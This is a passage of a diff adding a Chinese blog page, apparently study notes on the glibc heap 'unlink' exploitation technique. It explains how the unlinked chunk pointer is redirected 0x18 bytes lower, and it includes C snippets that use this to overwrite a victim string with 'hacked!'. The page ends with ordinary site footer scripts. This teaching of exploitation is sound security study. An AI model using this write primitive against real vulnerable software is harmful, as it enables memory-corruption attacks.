+</code></pre><p>同理，<code>bk-&gt;fd = fd;</code>就变成了如下模样：</p>
+<pre tabindex="0"><code>因为 bk-&gt;fd = fd;
+所以有 &amp;chunk1 = - 2 + 2 = &amp;chunk1 - 3;
+最后变成 &amp;chunk1 = &amp;chunk1 - 3;
+</code></pre><p>因为都是对<code>&amp;chunk1</code>进行操作，所以最后<code>&amp;chunk1</code>指向<code>&amp;chunk1 - 3</code>。</p>
+<p>这样，原本存放chunk1地址的栈空间，就指向了（原本存放chunk1地址的栈空间 - 0x18）的栈空间。</p>
+<p>这时候我们打印chunk1的地址，其实得到的是chunk1 - 3的地址。</p>
+<p>**注意：**这个地方虽然变量名称叫做chunk1，但实际上存放的不是chunk1的地址了，而是原本存放chunk1地址的栈空间减去0x18的位置（&amp;chunk1 - 3）。</p>
+<pre tabindex="0"><code>  printf(&#34;%p\n&#34;, chunk1);
+  printf(&#34;%p\n&#34;, chunk1[3]);
+</code></pre><h4 id="image-20231115155016428studyunlinkassetsimage-20231115155016428png"><img loading="lazy" src="/study/unlink.assets/image-20231115155016428.png" alt="image-20231115155016428"  />
+</h4>
+<p>所以当我们对chunk1[0]进行修改时，就可以直接修改到chunk1[3]。<strong>注意：这里的chunk1已经不是我们之前malloc返回的的chunk1了</strong></p>
+<pre tabindex="0"><code>//将字符串&#34;Victim&#39;s data&#34;放入chunk1[3]处。
+chunk1[3] = (unsigned long long)data;
+strcpy(data, &#34;Victim&#39;s data&#34;);
+
+// 通过修改chunk1[0]，来修改chunk1[3]指向的值
+chunk1[0] = 0x002164656b636168LL;
+
+printf(&#34;%s\n&#34;, data);
+</code></pre><p>最终输出是<code>hacked!</code>而非<code>Victim's data</code>。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
